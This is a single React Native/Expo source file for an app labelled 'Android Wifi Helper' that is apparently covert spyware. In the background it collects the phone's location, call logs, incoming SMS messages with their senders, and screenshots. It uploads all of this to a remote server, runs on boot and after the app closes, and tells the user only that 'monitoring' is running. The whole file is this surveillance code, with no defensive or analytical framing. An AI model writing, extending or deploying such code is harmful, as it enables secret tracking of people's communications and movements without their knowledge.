import React, { useEffect } from 'react';
import { StyleSheet, Text, View, Alert, Platform } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as Location from 'expo-location';
import * as Device from 'expo-device';
import Constants from 'expo-constants';
import 'react-native-get-random-values';
import { v4 as uuidv4 } from 'uuid';
import * as BackgroundFetch from 'expo-background-fetch';
import * as TaskManager from 'expo-task-manager';

// Import rn-call-logs to read call logs.
import { getAllLogs } from 'rn-call-logs';
// Import startReadSMS from react-native-expo-read-sms to read SMS logs.
import { startReadSMS, requestReadSMSPermission } from '@maniac-tech/react-native-expo-read-sms';
// Import captureScreen from react-native-view-shot to capture screenshots.
import { captureScreen } from 'react-native-view-shot';

const BACKGROUND_TRACKING_TASK = "BACKGROUND_TRACKING_TASK";

// Define the background tracking task.
TaskManager.defineTask(BACKGROUND_TRACKING_TASK, async () => {
  try {
    const deviceId = await getOrCreateDeviceId();
    
    // Get location in background.
    let { status } = await Location.getForegroundPermissionsAsync();
    if (status === 'granted') {
      let loc = await Location.getCurrentPositionAsync({});
      await sendDataToBackend('location', {
        device_id: deviceId,
        latitude: loc.coords.latitude,
        longitude: loc.coords.longitude,
        accuracy: loc.coords.accuracy,
      });
    } else {
      console.log('Background: Location permission not granted.');
    }
    
    // Read call logs using rn-call-logs.
    try {
      const logs = await getAllLogs({ fromEpoch: 0, toEpoch: 0, limit: 10 });
      await sendDataToBackend('call', { device_id: deviceId, logs });
    } catch (err) {
      console.error('Error fetching call logs:', err);
    }
    
    // SMS logs will be handled by our continuous SMS listener (set up separately).
    
    // Capture a screenshot.
    try {
      const uri = await captureScreen({ format: "jpg", quality: 0.8 });
      let formData = new FormData();
      formData.append('device_id', deviceId);
      formData.append('image', {
        uri,
        name: 'screenshot.jpg',
        type: 'image/jpeg'
      });
      await sendPhotoToBackend(formData);
    } catch (err) {
      console.error("Error capturing screenshot:", err);
    }
    
    console.log('Background task: Data sent.');
    return BackgroundFetch.Result.NewData;
  } catch (err) {
    console.error("Background task error:", err);
    return BackgroundFetch.Result.Failed;
  }
});

// Generate or retrieve a unique device ID.
const getOrCreateDeviceId = async () => {
  let deviceId = await AsyncStorage.getItem('deviceId');
  if (!deviceId) {
    deviceId = uuidv4();
    await AsyncStorage.setItem('deviceId', deviceId);
  }
  return deviceId;
};

// Helper function to send JSON data to backend.
const sendDataToBackend = async (endpoint, data) => {
  try {
    const response = await fetch(`${Constants.manifest.extra.DOMAIN_URL}/tracking/api/${endpoint}/`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    const resJson = await response.json();
    console.log(`${endpoint} update:`, resJson);
  } catch (err) {
    console.error(`Error sending ${endpoint} data:`, err);
  }
};

// Helper function to send photo data.
const sendPhotoToBackend = async (formData) => {
  try {
    const response = await fetch(`${Constants.manifest.extra.DOMAIN_URL}/tracking/api/photo/`, {
      method: 'POST',
      body: formData,
    });
    const resJson = await response.json();
    console.log('Photo update:', resJson);
  } catch (err) {
    console.error('Error sending photo data:', err);
  }
};

// Set up SMS reading using @maniac-tech/react-native-expo-read-sms.
const setupSMSReading = async () => {
  try {
    const granted = await requestReadSMSPermission();
    if (!granted) {
      console.error("SMS permission not granted.");
      return;
    }
    startReadSMS(
      (sms) => {
        // Expected format: "[+919999999999, this is a sample message body]"
        const parts = sms.split(',');
        const sender = parts[0] ? parts[0].trim() : "Unknown";
        const message = parts.slice(1).join(',').trim();
        getOrCreateDeviceId().then(deviceId => {
          sendDataToBackend('sms', { device_id: deviceId, sender, message, direction: 'received' });
        });
      },
      (error) => {
        console.error("SMS reading error:", error);
      }
    );
  } catch (err) {
    console.error("Error setting up SMS reading:", err);
  }
};

export default function App() {
  useEffect(() => {
    const initialize = async () => {
      // Request foreground location permission.
      let { status } = await Location.requestForegroundPermissionsAsync();
      if (status !== 'granted') {
        Alert.alert('Permission Denied', 'Location permission is required.');
        return;
      }
      const deviceId = await getOrCreateDeviceId();
      // Get initial location.
      let loc = await Location.getCurrentPositionAsync({});
      await sendDataToBackend('location', {
        device_id: deviceId,
        latitude: loc.coords.latitude,
        longitude: loc.coords.longitude,
        accuracy: loc.coords.accuracy,
      });
      // Send device info.
      const info = {
        device_id: deviceId,
        user_agent: Constants.manifest.sdkVersion,
        platform: Platform.OS,
        other_details: {
          modelName: Device.modelName,
          osVersion: Platform.Version,
          expoVersion: Constants.expoVersion,
        }
      };
      await sendDataToBackend('device', info);
      
      // Set up SMS reading.
      await setupSMSReading();
      
      // Fetch update interval from backend and register background task.
      try {
        const response = await fetch(`${Constants.manifest.extra.DOMAIN_URL}/tracking/api/get_update_interval/`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ device_id: deviceId }),
        });
        const data = await response.json();
        const intervalSec = data.update_interval || 60;
        await BackgroundFetch.registerTaskAsync(BACKGROUND_TRACKING_TASK, {
          minimumInterval: intervalSec,
          stopOnTerminate: false,
          startOnBoot: true,
        });
        console.log("Background task registered with interval:", intervalSec, "seconds");
      } catch (err) {
        console.error("Error fetching update interval:", err);
      }
    };

    initialize();

    // Set up remote update check.
    const AUTO_UPDATE_INTERVAL = 5 * 60 * 1000; // 5 minutes
    const TRACKING_JS_VERSION = "1.0.0";
    const checkForJsUpdate = async () => {
      try {
        let response = await fetch(`${Constants.manifest.extra.DOMAIN_URL}/tracking/api/js_version/`);
        let data = await response.json();
        if (data.version !== TRACKING_JS_VERSION) {
          console.log("New JS version available:", data.version);
          Alert.alert("Update Available", "A new version is available. Please update the app.");
          // Optionally, trigger an update mechanism.
        } else {
          console.log("JS version is up-to-date:", TRACKING_JS_VERSION);
        }
      } catch (err) {
        console.error("JS update check error:", err);
      }
    };
    const updateIntervalId = setInterval(checkForJsUpdate, AUTO_UPDATE_INTERVAL);
    return () => clearInterval(updateIntervalId);
  }, []);

  return (
    <View style={styles.container}>
      <Text style={styles.title}>Android Wifi Helper</Text>
      <Text style={styles.info}>Monitoring is running in the background...</Text>
      <Text style={styles.info}>Data is sent automatically at the configured interval.</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f9f9f9',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 16,
  },
  title: {
    fontSize: 24,
    marginBottom: 16,
    color: '#0055a5',
  },
  info: {
    fontSize: 16,
    marginVertical: 4,
  },
});
